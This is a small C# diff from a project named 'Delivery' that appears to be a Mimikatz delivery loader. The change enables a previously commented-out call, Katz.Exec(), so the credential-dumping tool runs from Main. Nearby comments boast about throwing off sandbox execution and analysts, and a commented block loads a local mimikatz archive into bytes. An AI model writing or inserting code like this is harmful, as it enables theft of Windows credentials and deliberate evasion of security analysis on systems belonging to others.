@@ -51,7 +51,7 @@ namespace Delivery
         {
             Console.WriteLine("Hello From Main...I Don't Do Anything");
             //Add any behaviour here to throw off sandbox execution/analysts :)
-            //Katz.Exec();
+            Katz.Exec();
 
             /*
             byte[] b  = Misc.FileToByteArray(@"F:\Downloads\mimikatz_trunk12312015.zip");
